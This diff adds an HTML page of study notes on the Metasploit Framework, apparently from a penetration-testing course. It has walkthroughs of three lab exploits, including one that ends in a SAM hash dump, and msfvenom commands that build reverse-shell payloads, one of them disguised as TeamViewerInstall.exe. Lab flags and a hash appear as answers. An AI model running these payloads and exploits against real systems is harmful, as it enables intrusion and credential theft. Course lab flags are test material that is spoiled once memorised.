@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Metasploit Framework — Field Notes</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0c10; --surface: #0f1318; --surface2: #151b24; --border: #1e2a38;
+    --accent: #00d4ff; --accent2: #ff6b35; --accent3: #39ff14; --accent4: #c97bff;
+    --text: #c8d8e8; --text-dim: #5a7a96; --text-bright: #e8f4ff;
+    --mono: 'Share Tech Mono', monospace; --head: 'Rajdhani', sans-serif; --body: 'Inter', sans-serif;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; scroll-padding-top: 70px; }
+  body { background: var(--bg); color: var(--text); font-family: var(--body); font-size: 14px; line-height: 1.7; -webkit-font-smoothing: antialiased; }
+  body::before { content: ''; position: fixed; inset: 0; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,212,255,0.012) 2px, rgba(0,212,255,0.012) 4px); pointer-events: none; z-index: 9999; }
+
+  /* ---------- TOPBAR ---------- */
+  .topbar { border-bottom: 1px solid var(--border); padding: 12px 32px; display: flex; align-items: center; gap: 16px; background: var(--surface); position: sticky; top: 0; z-index: 200; }
+  .topbar-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--accent3); box-shadow: 0 0 8px var(--accent3); animation: pulse 2s infinite; }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+  .topbar-title { font-family: var(--mono); font-size: 12px; color: var(--accent); letter-spacing: 2px; text-transform: uppercase; }
+  .topbar-back { font-family: var(--mono); font-size: 11px; color: var(--text-dim); text-decoration: none; border: 1px solid var(--border); padding: 4px 10px; border-radius: 3px; transition: .2s; }
+  .topbar-back:hover { color: var(--accent); border-color: var(--accent); }
+  .topbar-right { margin-left: auto; font-family: var(--mono); font-size: 11px; color: var(--text-dim); }
+
+  /* ---------- LAYOUT ---------- */
+  .page { display: flex; max-width: 1400px; margin: 0 auto; }
+  .sidebar { width: 230px; flex-shrink: 0; background: var(--surface); border-right: 1px solid var(--border); height: calc(100vh - 49px); position: sticky; top: 49px; overflow-y: auto; padding: 24px 0; }
+  .sidebar-group { padding: 0 20px; margin-bottom: 22px; }
+  .sidebar-label { font-family: var(--mono); font-size: 10px; letter-spacing: 2px; color: var(--text-dim); text-transform: uppercase; margin-bottom: 10px; padding-left: 8px; border-left: 2px solid var(--border); }
+  .sidebar a { display: block; font-size: 13px; color: var(--text); text-decoration: none; padding: 5px 8px; border-radius: 3px; transition: .15s; }
+  .sidebar a:hover { color: var(--accent); background: var(--surface2); padding-left: 12px; }
+  .sidebar a .n { font-family: var(--mono); font-size: 11px; color: var(--text-dim); margin-right: 8px; }
+
+  .main { flex: 1; min-width: 0; padding: 40px 48px 120px; }
+
+  /* ---------- HERO ---------- */
+  .hero { border: 1px solid var(--border); border-radius: 6px; padding: 32px; background: linear-gradient(135deg, var(--surface) 0%, var(--bg) 100%); margin-bottom: 44px; position: relative; overflow: hidden; }
+  .hero::after { content: ''; position: absolute; top: 0; right: 0; width: 280px; height: 100%; background: radial-gradient(circle at top right, rgba(0,212,255,0.07), transparent 70%); }
+  .hero-eyebrow { font-family: var(--mono); font-size: 11px; letter-spacing: 3px; color: var(--accent2); text-transform: uppercase; margin-bottom: 12px; }
+  .hero h1 { font-family: var(--head); font-size: 42px; font-weight: 700; color: var(--text-bright); letter-spacing: 1px; line-height: 1.05; }
+  .hero h1 span { color: var(--accent); }
+  .hero p { margin-top: 14px; max-width: 640px; color: var(--text-dim); }
+  .hero-meta { display: flex; gap: 28px; margin-top: 22px; font-family: var(--mono); font-size: 11px; }
+  .hero-meta div { color: var(--text-dim); }
+  .hero-meta b { display: block; color: var(--accent3); font-size: 17px; margin-top: 2px; }
+
+  /* ---------- SECTIONS ---------- */
+  section { margin-bottom: 52px; scroll-margin-top: 70px; }
+  .section-head { display: flex; align-items: baseline; gap: 14px; padding-bottom: 12px; border-bottom: 1px solid var(--border); margin-bottom: 24px; }
+  .section-num { font-family: var(--mono); font-size: 13px; color: var(--accent2); }
+  .section-title { font-family: var(--head); font-size: 26px; font-weight: 600; color: var(--text-bright); letter-spacing: .5px; }
+  h3 { font-family: var(--head); font-size: 18px; font-weight: 600; color: var(--accent); margin: 26px 0 12px; letter-spacing: .5px; }
+  h4 { font-family: var(--head); font-size: 15px; font-weight: 600; color: var(--text-bright); margin: 18px 0 8px; }
+  p { margin-bottom: 12px; }
+  .main a { color: var(--accent); }
+
+  /* ---------- CARDS ---------- */
+  .card { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 22px 24px; margin-bottom: 18px; }
+  .card-title { font-family: var(--head); font-size: 16px; font-weight: 600; color: var(--text-bright); margin-bottom: 14px; letter-spacing: .3px; }
+
+  /* ---------- CODE BLOCKS ---------- */
+  .code-block { background: #070a0e; border: 1px solid var(--border); border-left: 2px solid var(--accent); border-radius: 4px; padding: 14px 16px; font-family: var(--mono); font-size: 12.5px; line-height: 1.8; color: var(--text-bright); overflow-x: auto; margin: 12px 0; white-space: pre-wrap; word-break: break-word; }
+  .code-block.out { border-left-color: var(--text-dim); color: var(--text-dim); }
+  .prompt { color: var(--accent); }
+  .comment { color: #4a6b54; font-style: italic; }
+  .flag { color: var(--accent3); font-weight: bold; }
+  .ps { color: var(--accent4); }
+  .hl { color: var(--accent2); }
+
+  /* ---------- ANSWER BOX ---------- */
+  .answer-box { display: flex; gap: 14px; align-items: flex-start; background: rgba(57,255,20,0.05); border: 1px solid rgba(57,255,20,0.3); border-radius: 5px; padding: 14px 18px; margin: 16px 0; }
+  .answer-icon { width: 26px; height: 26px; flex-shrink: 0; border-radius: 50%; background: var(--accent3); color: #04210a; font-weight: 700; display: flex; align-items: center; justify-content: center; font-size: 15px; box-shadow: 0 0 12px rgba(57,255,20,0.4); }
+  .answer-q { font-size: 12px; color: var(--text-dim); text-transform: uppercase; letter-spacing: 1px; font-family: var(--mono); }
+  .answer-a { font-family: var(--mono); font-size: 16px; color: var(--accent3); margin-top: 3px; word-break: break-all; }
+
+  /* ---------- ALERTS ---------- */
+  .alert { border-radius: 5px; padding: 12px 16px; margin: 14px 0; font-size: 13px; border-left: 3px solid var(--accent2); background: rgba(255,107,53,0.06); color: var(--text); }
+  .alert-blue { border-left-color: var(--accent); background: rgba(0,212,255,0.06); }
+  .alert b { color: var(--text-bright); }
+
+  /* ---------- OS PILLS ---------- */
+  .pill { display: inline-block; font-family: var(--mono); font-size: 10px; letter-spacing: 1px; text-transform: uppercase; padding: 2px 9px; border-radius: 20px; margin-left: 8px; vertical-align: middle; }
+  .os-win { color: #6fb7ff; background: rgba(74,158,255,0.12); border: 1px solid rgba(74,158,255,0.35); }
+  .os-nix { color: var(--accent2); background: rgba(255,107,53,0.1); border: 1px solid rgba(255,107,53,0.35); }
+  .os-any { color: var(--accent4); background: rgba(201,123,255,0.1); border: 1px solid rgba(201,123,255,0.35); }
+
+  /* ---------- STEPS ---------- */
+  .step { display: flex; gap: 14px; margin-bottom: 14px; }
+  .step-num { width: 26px; height: 26px; flex-shrink: 0; border-radius: 50%; border: 1px solid var(--accent); color: var(--accent); font-family: var(--mono); font-size: 12px; display: flex; align-items: center; justify-content: center; }
+  .step-body { flex: 1; min-width: 0; }
+  .step-title { font-weight: 600; color: var(--text-bright); margin-bottom: 4px; }
+
+  /* ---------- TABLES ---------- */
+  table { width: 100%; border-collapse: collapse; margin: 14px 0; font-size: 13px; }
+  th, td { text-align: left; padding: 9px 12px; border-bottom: 1px solid var(--border); vertical-align: top; }
+  th { font-family: var(--mono); font-size: 11px; letter-spacing: 1px; text-transform: uppercase; color: var(--accent); background: var(--surface2); }
+  td code, p code, li code { font-family: var(--mono); font-size: 12px; color: var(--accent); background: var(--surface2); padding: 1px 6px; border-radius: 3px; }
+  tr:hover td { background: rgba(0,212,255,0.02); }
+
+  ul, ol { margin: 10px 0 12px 22px; }
+  li { margin-bottom: 6px; }
+
+  .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  .grid-3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
+
+  .footer { border-top: 1px solid var(--border); margin-top: 60px; padding-top: 24px; font-family: var(--mono); font-size: 11px; color: var(--text-dim); display: flex; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
+
+  /* ---------- RESPONSIVE ---------- */
+  @media (max-width: 900px) {
+    .sidebar { display: none; }
+    .main { padding: 28px 20px 80px; }
+    .hero h1 { font-size: 30px; }
+    .grid-2, .grid-3 { grid-template-columns: 1fr; }
+    .topbar { padding: 12px 18px; }
+  }
+  @media (prefers-reduced-motion: reduce) { * { animation: none !important; scroll-behavior: auto; } }
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <span class="topbar-dot"></span>
+  <span class="topbar-title">Module 08 // Metasploit Framework</span>
+  <a class="topbar-back" href="../index.html">&larr; index</a>
+  <span class="topbar-right">CPTS · leviathan516</span>
+</div>
+
+<div class="page">
+
+  <!-- SIDEBAR -->
+  <nav class="sidebar">
+    <div class="sidebar-group">
+      <div class="sidebar-label">Components</div>
+      <a href="#modules"><span class="n">01</span>Modules</a>
+      <a href="#targets"><span class="n">02</span>Targets &amp; Payloads</a>
+      <a href="#encoders"><span class="n">03</span>Encoders</a>
+      <a href="#plugins"><span class="n">04</span>Database &amp; Plugins</a>
+      <a href="#mixins"><span class="n">05</span>Mixins</a>
+    </div>
+    <div class="sidebar-group">
+      <div class="sidebar-label">Sessions</div>
+      <a href="#sessions"><span class="n">06</span>Sessions</a>
+      <a href="#jobs"><span class="n">07</span>Jobs</a>
+    </div>
+    <div class="sidebar-group">
+      <div class="sidebar-label">Meterpreter</div>
+      <a href="#meterpreter"><span class="n">08</span>Meterpreter</a>
+    </div>
+    <div class="sidebar-group">
+      <div class="sidebar-label">Evasion</div>
+      <a href="#msfvenom"><span class="n">09</span>MSFVenom</a>
+      <a href="#firewall"><span class="n">10</span>Firewall / IDS</a>
+      <a href="#evasion"><span class="n">11</span>Evasion Techniques</a>
+    </div>
+    <div class="sidebar-group">
+      <div class="sidebar-label">Labs</div>
+      <a href="#lab-druid">Apache Druid</a>
+      <a href="#lab-elfinder">elFinder &rarr; Sudo</a>
+      <a href="#lab-fortilogger">FortiLogger</a>
+    </div>
+  </nav>
+
+  <!-- MAIN -->
+  <main class="main">
+
+    <div class="hero">
+      <div class="hero-eyebrow">Post-Exploitation Framework</div>
+      <h1>Metasploit <span>Framework</span></h1>
+      <p>Modules, sessions &amp; jobs, the Meterpreter payload, and a high-level look at MSFVenom and AV/IDS evasion. Three skill-assessment labs: Apache Druid RCE, an elFinder &rarr; Sudo Baron Samedit chain, and FortiLogger to a SAM dump.</p>
+      <div class="hero-meta">
+        <div>SECTIONS <b>11</b></div>
+        <div>LABS <b>3</b></div>
+        <div>FLAGS <b>2</b></div>
+        <div>TOOL <b>MSF6</b></div>
+      </div>
+    </div>
+
+    <!-- 01 MODULES -->
+    <section id="modules">
+      <div class="section-head"><span class="section-num">01</span><span class="section-title">Modules</span></div>
+      <p>Metasploit ships with several module types. Each lives in its own category and serves a distinct role in the exploitation chain.</p>
+      <table>
+        <tr><th>Type</th><th>Description</th></tr>
+        <tr><td><code>Auxiliary</code></td><td>Scanning, fuzzing, sniffing, and admin capabilities. Extra assistance and functionality.</td></tr>
+        <tr><td><code>Encoders</code></td><td>Ensure payloads arrive intact at their destination.</td></tr>
+        <tr><td><code>Exploits</code></td><td>Exploit a vulnerability to allow payload delivery.</td></tr>
+        <tr><td><code>NOPs</code></td><td>No Operation code — keep payload sizes consistent across attempts.</td></tr>
+        <tr><td><code>Payloads</code></td><td>Code that runs remotely and calls back to establish a connection/shell.</td></tr>
+        <tr><td><code>Plugins</code></td><td>Extra scripts integrated into and coexisting with <code>msfconsole</code>.</td></tr>
+        <tr><td><code>Post</code></td><td>Gather information, pivot deeper, etc.</td></tr>
+      </table>
+      <div class="alert alert-blue">Only <b>Auxiliary</b>, <b>Exploits</b>, and <b>Post</b> are interactive — they can be loaded with the <code>use</code> keyword.</div>
+    </section>
+
+    <!-- 02 TARGETS & PAYLOADS -->
+    <section id="targets">
+      <div class="section-head"><span class="section-num">02</span><span class="section-title">Targets &amp; Payloads</span></div>
+      <h3>Targets</h3>
+      <p>Run from inside an exploit module, <code>show targets</code> lists every vulnerable target supported by that exploit.</p>
+      <div class="code-block"><span class="prompt">msf6 exploit(...) &gt; </span>show targets</div>
+      <h3>Payloads</h3>
+      <p>Nothing new conceptually — just keep the capabilities of a Meterpreter session in mind: PrivEsc, hash dumping, and file download/upload.</p>
+    </section>
+
+    <!-- LAB DRUID -->
+    <section id="lab-druid">
+      <div class="section-head"><span class="section-num">LAB</span><span class="section-title">Apache Druid RCE <span class="pill os-nix">linux</span></span></div>
+      <div class="card">
+        <div class="card-title">Target 10.129.203.52 — exploit Apache Druid and read flag.txt</div>
+        <div class="step">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <div class="step-title">Service enumeration</div>
+            <div class="code-block"><span class="prompt">$ </span>nmap -oN target_service_enum 10.129.203.52 -sC -sV</div>
+            <div class="code-block out">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
+8081/tcp open  http    Jetty 9.4.12  <span class="comment"># http-title: Apache Druid</span>
+8082/tcp open  http    Jetty 9.4.12
+8083/tcp open  http    Jetty 9.4.12
+8888/tcp open  http    Jetty 9.4.12  <span class="comment"># http-title: Apache Druid</span></div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <div class="step-title">Find the matching module</div>
+            <div class="code-block"><span class="prompt">msf6 &gt; </span>search Apache Druid</div>
+            <div class="code-block out">0  exploit/linux/http/apache_druid_js_rce          excellent  Apache Druid 0.20.0 RCE
+3  exploit/multi/http/apache_druid_cve_2023_25194  excellent  Druid JNDI Injection RCE
+7  auxiliary/scanner/http/log4shell_scanner        normal     Log4Shell HTTP Scanner</div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">3</div>
+          <div class="step-body">
+            <div class="step-title">Configure and run</div>
+            <div class="code-block"><span class="prompt">msf6 &gt; </span>use 0
+<span class="prompt">msf6 exploit(linux/http/apache_druid_js_rce) &gt; </span>set rhost 10.129.203.52
+<span class="prompt">msf6 exploit(linux/http/apache_druid_js_rce) &gt; </span>set lhost 10.10.15.67
+<span class="prompt">msf6 exploit(linux/http/apache_druid_js_rce) &gt; </span>run</div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">4</div>
+          <div class="step-body">
+            <div class="step-title">Grab the flag</div>
+            <div class="code-block"><span class="prompt">meterpreter &gt; </span>shell
+whoami        <span class="comment"># root</span>
+cd /root
+ls            <span class="comment"># druid  druid.sh  flag.txt</span>
+cat flag.txt</div>
+          </div>
+        </div>
+        <div class="answer-box">
+          <div class="answer-icon">&#10003;</div>
+          <div>
+            <div class="answer-q">flag.txt</div>
+            <div class="answer-a"><span class="flag">HTB{MSF_Expl01t4t10n}</span></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 03 ENCODERS -->
+    <section id="encoders">
+      <div class="section-head"><span class="section-num">03</span><span class="section-title">Encoders</span></div>
+      <p>Encoders change a payload so it can run on different operating systems and architectures: <code>x64</code>, <code>x86</code>, <code>sparc</code>, <code>ppc</code>, <code>mips</code>.</p>
+      <div class="alert">Most encoders are detected by modern AV. Encoding alone is rarely enough for evasion today.</div>
+      <h4>List encoders</h4>
+      <div class="code-block"><span class="prompt">msf6 &gt; </span>show encoders</div>
+      <h4>Set iterations with <code>-i</code></h4>
+      <div class="code-block"><span class="prompt">$ </span>msfvenom -a x86 --platform windows \
+  -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 \
+  -e x86/shikata_ga_nai -f exe -i 10 \
+  -o /root/Desktop/TeamViewerInstall.exe</div>
+      <h4>Check detection rate (VirusTotal)</h4>
+      <div class="code-block"><span class="prompt">$ </span>msf-virustotal -k <span class="hl">&lt;API key&gt;</span> -f TeamViewerInstall.exe</div>
+    </section>
+
+    <!-- 04 DATABASE & PLUGINS -->
+    <section id="plugins">
+      <div class="section-head"><span class="section-num">04</span><span class="section-title">Database &amp; Plugins</span></div>
+      <h3>Database</h3>
+      <p>MSF can import hosts and scan results, store credentials/loot, and back up its database — keeping hosts, services, and vulnerabilities available at a glance.</p>
+      <h3>Plugins</h3>
+      <p>Plugins are third-party tools integrated into MSF. They bring known software into <code>msfconsole</code>, automate repetitive tasks, add commands, and work directly with the framework API.</p>
+      <h4>List installed plugins</h4>
+      <div class="code-block"><span class="prompt">$ </span>ls /usr/share/metasploit-framework/plugins</div>
+      <div class="code-block out">aggregator.rb  beholder.rb  nessus.rb  nexpose.rb  openvas.rb  wmap.rb  ...</div>
+      <h4>Load a plugin</h4>
+      <div class="code-block"><span class="prompt">msf6 &gt; </span>load nessus
+<span class="prompt">msf6 &gt; </span>nessus_help</div>
+      <div class="code-block out">[*] Nessus Bridge for Metasploit
+[*] Successfully loaded Plugin: Nessus</div>
+      <h4>Install a custom plugin</h4>
+      <div class="code-block"><span class="prompt">$ </span>git clone https://github.com/darkoperator/Metasploit-Plugins
+<span class="prompt">$ </span>sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
+<span class="prompt">$ </span>msfconsole -q
+<span class="prompt">msf6 &gt; </span>load pentest   <span class="comment"># extends the help menu with new command groups</span></div>
+      <table>
+        <tr><th>Plugin</th><th>Status</th></tr>
+        <tr><td>Nmap / NexPose / Nessus</td><td>pre-installed</td></tr>
+        <tr><td>Mimikatz (v1) / Stdapi / Incognito</td><td>pre-installed</td></tr>
+        <tr><td>Railgun / Priv</td><td>—</td></tr>
+        <tr><td>DarkOperator's</td><td>external</td></tr>
+      </table>
+    </section>
+
+    <!-- 05 MIXINS -->
+    <section id="mixins">
+      <div class="section-head"><span class="section-num">05</span><span class="section-title">Mixins</span></div>
+      <p>MSF is written in Ruby. Mixins are classes that act as methods for other classes without being their parent — so it's <em>inclusion</em>, not inheritance. They're used to provide many optional features to one class, or to reuse one feature across many classes. In Ruby they're implemented as Modules via <code>include</code>.</p>
+      <div class="alert alert-blue">You don't need to worry about Mixins when starting out — they're noted only to show how deep Metasploit's customization can go.</div>
+    </section>
+
+    <!-- 06 SESSIONS -->
+    <section id="sessions">
+      <div class="section-head"><span class="section-num">06</span><span class="section-title">Sessions</span></div>
+      <p><code>msfconsole</code> manages multiple modules at once using <b>sessions</b> — dedicated control interfaces for every deployed module. A backgrounded session keeps running and the connection persists, but it can die if the payload runtime tears down the channel.</p>
+      <h4>Background a session</h4>
+      <p>Press <code>[CTRL]+[Z]</code>, or type <code>background</code> in a Meterpreter session, then confirm to return to the <code>msf6 &gt;</code> prompt.</p>
+      <h4>List active sessions</h4>
+      <div class="code-block"><span class="prompt">msf6 &gt; </span>sessions</div>
+      <div class="code-block out">Id  Type                     Information                 Connection
+1   meterpreter x86/windows  NT AUTHORITY\SYSTEM @ MS01  10.10.10.129:443 -&gt; 10.10.10.205:50501</div>
+      <h4>Interact with a session</h4>
+      <div class="code-block"><span class="prompt">msf6 &gt; </span>sessions -i 1
+<span class="comment">[*] Starting interaction with 1...</span>
+<span class="prompt">meterpreter &gt; </span></div>
+      <div class="alert alert-blue">Useful for running an extra module on an already-exploited host: background the session, search the second module, then set the session number in its <code>show options</code>. These live in the <code>post</code> category — credential gatherers, local exploit suggesters, internal scanners.</div>
+    </section>
+
+    <!-- 07 JOBS -->
+    <section id="jobs">
+      <div class="section-head"><span class="section-num">07</span><span class="section-title">Jobs</span></div>
+      <p>If an active exploit is holding a port you need for another module, you can't just <code>[CTRL]+[C]</code> it — the port stays in use. Use <code>jobs</code> to view and terminate background tasks. Tasks can be converted to jobs so they keep running even if the session dies.</p>
+      <h4>Run an exploit as a job</h4>
+      <div class="code-block"><span class="prompt">msf6 exploit(multi/handler) &gt; </span>exploit -j</div>
+      <div class="code-block out">[*] Exploit running as background job 0.
+[*] Started reverse TCP handler on 10.10.14.34:4444</div>
+      <h4>List &amp; kill jobs</h4>
+      <div class="code-block"><span class="prompt">msf6 &gt; </span>jobs -l        <span class="comment"># list all running jobs</span>
+<span class="prompt">msf6 &gt; </span>kill 0         <span class="comment"># kill one job by index</span>
+<span class="prompt">msf6 &gt; </span>jobs -K        <span class="comment"># kill all jobs</span></div>
+    </section>
+
+    <!-- LAB ELFINDER -->
+    <section id="lab-elfinder">
+      <div class="section-head"><span class="section-num">LAB</span><span class="section-title">elFinder &rarr; Sudo Baron Samedit <span class="pill os-nix">linux</span></span></div>
+      <div class="card">
+        <div class="card-title">Target 10.129.24.225 — web app &rarr; www-data &rarr; root</div>
+        <div class="grid-2">
+          <div class="answer-box">
+            <div class="answer-icon">&#10003;</div>
+            <div>
+              <div class="answer-q">Web application (HTML source)</div>
+              <div class="answer-a">elfinder</div>
+            </div>
+          </div>
+          <div class="answer-box">
+            <div class="answer-icon">&#10003;</div>
+            <div>
+              <div class="answer-q">Shell user via MSF exploit</div>
+              <div class="answer-a">www-data</div>
+            </div>
+          </div>
+        </div>
+        <h4>PrivEsc — Sudo v1.8.31 (CVE-2021-3156)</h4>
+        <div class="step">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <div class="step-title">Background the www-data session and search</div>
+            <div class="code-block"><span class="prompt">(Meterpreter 1) &gt; </span>background
+<span class="prompt">msf6 &gt; </span>search sudo v1.8.31</div>
+            <div class="code-block out">0  exploit/linux/local/sudo_baron_samedit  excellent  Sudo Heap-Based Buffer Overflow</div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <div class="step-title">Point the local exploit at the session</div>
+            <div class="code-block"><span class="prompt">msf6 &gt; </span>use 0
+<span class="prompt">msf6 exploit(linux/local/sudo_baron_samedit) &gt; </span>set lhost 10.10.15.67
+<span class="prompt">msf6 exploit(linux/local/sudo_baron_samedit) &gt; </span>set session 1
+<span class="prompt">msf6 exploit(linux/local/sudo_baron_samedit) &gt; </span>run</div>
+            <div class="alert">MSF warns the session arch (x86) may be incompatible, but it still works against the auto-selected <code>Ubuntu 20.04 x64 (sudo v1.8.31, libc v2.31)</code> target.</div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">3</div>
+          <div class="step-body">
+            <div class="step-title">Drop to a shell and grab the flag</div>
+            <div class="code-block"><span class="comment"># whoami is not a Meterpreter command — drop to a system shell first</span>
+<span class="prompt">(Meterpreter 2) &gt; </span>shell
+whoami        <span class="comment"># root</span>
+cd
+ls            <span class="comment"># flag.txt  snap</span>
+cat flag.txt</div>
+          </div>
+        </div>
+        <div class="answer-box">
+          <div class="answer-icon">&#10003;</div>
+          <div>
+            <div class="answer-q">flag.txt</div>
+            <div class="answer-a"><span class="flag">HTB{5e55ion5_4r3_sw33t}</span></div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 08 METERPRETER -->
+    <section id="meterpreter">
+      <div class="section-head"><span class="section-num">08</span><span class="section-title">Meterpreter</span></div>
+      <div class="alert alert-blue"><b>TL;DR</b> — Nothing new. Use <code>help</code> inside a Meterpreter session and review the command capabilities for PrivEsc / credential harvesting / impersonation / etc.</div>
+    </section>
+
+    <!-- LAB FORTILOGGER -->
+    <section id="lab-fortilogger">
+      <div class="section-head"><span class="section-num">LAB</span><span class="section-title">FortiLogger File Upload <span class="pill os-win">windows</span></span></div>
+      <div class="card">
+        <div class="card-title">Target 10.129.203.65 — file upload &rarr; SYSTEM &rarr; SAM dump</div>
+        <div class="step">
+          <div class="step-num">1</div>
+          <div class="step-body">
+            <div class="step-title">Enumerate</div>
+            <div class="code-block"><span class="prompt">$ </span>nmap -oN target_meterpreter_enum 10.129.203.65 -sV --script vuln</div>
+            <div class="code-block out">135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds?
+3389/tcp open  ms-wbt-server  Microsoft Terminal Services
+5000/tcp open  http           Microsoft HTTPAPI httpd 2.0   <span class="comment"># FortiLogger login at :5000/home</span>
+5985/tcp open  http           Microsoft HTTPAPI httpd 2.0</div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">2</div>
+          <div class="step-body">
+            <div class="step-title">Find, configure, run</div>
+            <div class="code-block"><span class="prompt">msf6 &gt; </span>search fortilogger
+<span class="prompt">msf6 &gt; </span>use 0   <span class="comment"># exploit/windows/http/fortilogger_arbitrary_fileupload</span>
+<span class="prompt">msf6 exploit(...) &gt; </span>set rhost 10.129.203.65
+<span class="prompt">msf6 exploit(...) &gt; </span>set lhost 10.10.15.67
+<span class="prompt">msf6 exploit(...) &gt; </span>run</div>
+            <div class="code-block out">[+] The target is vulnerable. FortiLogger version 4.4.2.2
+[+] Payload has been uploaded
+[*] Meterpreter session 1 opened</div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">3</div>
+          <div class="step-body">
+            <div class="step-title">Confirm the user</div>
+            <div class="code-block"><span class="prompt">(Meterpreter 1) &gt; </span>shell
+<span class="ps">C:\Windows\system32&gt; </span>whoami</div>
+            <div class="answer-box">
+              <div class="answer-icon">&#10003;</div>
+              <div>
+                <div class="answer-q">Shell user</div>
+                <div class="answer-a">nt authority\system</div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num">4</div>
+          <div class="step-body">
+            <div class="step-title">Dump the SAM with kiwi (Mimikatz)</div>
+            <div class="code-block"><span class="comment"># lsa_dump_sam requires the kiwi extension</span>
+<span class="prompt">(Meterpreter 1) &gt; </span>load kiwi
+<span class="prompt">(Meterpreter 1) &gt; </span>lsa_dump_sam</div>
+            <div class="code-block out">[+] Running as SYSTEM
+[*] Dumping SAM
+RID  : 000003ea (1002)
+User : htb-student
+  Hash NTLM: cf3a5525ee9414229e66279623ed5c58</div>
+          </div>
+        </div>
+        <div class="answer-box">
+          <div class="answer-icon">&#10003;</div>
+          <div>
+            <div class="answer-q">htb-student NTLM hash</div>
+            <div class="answer-a">cf3a5525ee9414229e66279623ed5c58</div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 09 MSFVENOM -->
+    <section id="msfvenom">
+      <div class="section-head"><span class="section-num">09</span><span class="section-title">MSFVenom &amp; Payload Crafting</span></div>
+      <p>MSFVenom is the successor to MSFPayload (generated shellcode) and MSFEncode (applied encoders). It crafts payloads for different targets and cleans up shellcode so it runs without errors.</p>
+      <div class="alert">AV evasion is much harder today. Heuristics, machine learning, and deep packet inspection mean running a payload through encoder iterations is no longer enough — a default payload can hit detection rates like <b>52/65</b>.</div>
+
+      <h3>FTP + web service scenario <span class="pill os-win">windows</span></h3>
+      <p>Anonymous FTP whose root is served by IIS on <code>tcp/80</code>; uploaded files execute. Drop an <code>.aspx</code> shell via FTP, trigger it from the web, catch a reverse TCP connection.</p>
+      <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-body">
+          <div class="step-title">Generate the payload</div>
+          <div class="code-block"><span class="prompt">$ </span>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx &gt; reverse_shell.aspx</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">2</div>
+        <div class="step-body">
+          <div class="step-title">Upload via FTP, then set up the handler</div>
+          <div class="code-block"><span class="prompt">ftp&gt; </span>put reverse_shell.aspx
+<span class="prompt">$ </span>msfconsole -q
+<span class="prompt">msf6 &gt; </span>use multi/handler
+<span class="prompt">msf6 exploit(multi/handler) &gt; </span>set LHOST 10.10.14.5
+<span class="prompt">msf6 exploit(multi/handler) &gt; </span>set LPORT 1337
+<span class="prompt">msf6 exploit(multi/handler) &gt; </span>run</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-num">3</div>
+        <div class="step-body">
+          <div class="step-title">Trigger &amp; catch</div>
+          <p>Browse to <code>http://10.10.10.5/reverse_shell.aspx</code> — the page renders blank but the payload runs.</p>
+          <div class="code-block out">[*] Meterpreter session 1 opened
+<span class="prompt">meterpreter &gt; </span>getuid
+Server username: IIS APPPOOL\Web</div>
+        </div>
+      </div>
+
+      <h3>Local Exploit Suggester &rarr; KiTrap0D</h3>
+      <p>The <code>IIS APPPOOL\Web</code> user has few permissions; the box is x86. Run the suggester, then escalate.</p>
+      <div class="code-block"><span class="prompt">msf6 &gt; </span>use post/multi/recon/local_exploit_suggester
+<span class="prompt">msf6 post(...) &gt; </span>set session 2
+<span class="prompt">msf6 post(...) &gt; </span>run
+<span class="comment"># bypassuac_eventvwr fails (IIS user not admin) — ms10_015_kitrap0d works</span>
+<span class="prompt">msf6 &gt; </span>use exploit/windows/local/ms10_015_kitrap0d
+<span class="prompt">msf6 exploit(...) &gt; </span>set SESSION 3
+<span class="prompt">msf6 exploit(...) &gt; </span>run</div>
+      <div class="code-block out"><span class="prompt">meterpreter &gt; </span>getuid
+Server username: NT AUTHORITY\SYSTEM</div>
+    </section>
+
+    <!-- 10 FIREWALL / IDS -->
+    <section id="firewall">
+      <div class="section-head"><span class="section-num">10</span><span class="section-title">Firewall &amp; IDS/IPS Evasion</span></div>
+      <div class="grid-3">
+        <div class="card">
+          <div class="card-title">Endpoint protection</div>
+          <p>Localized software protecting one host (PC, workstation, DMZ server). Bundles AV, anti-malware, firewall, anti-DDoS. e.g. Avast, NOD32, Malwarebytes, BitDefender.</p>
+        </div>
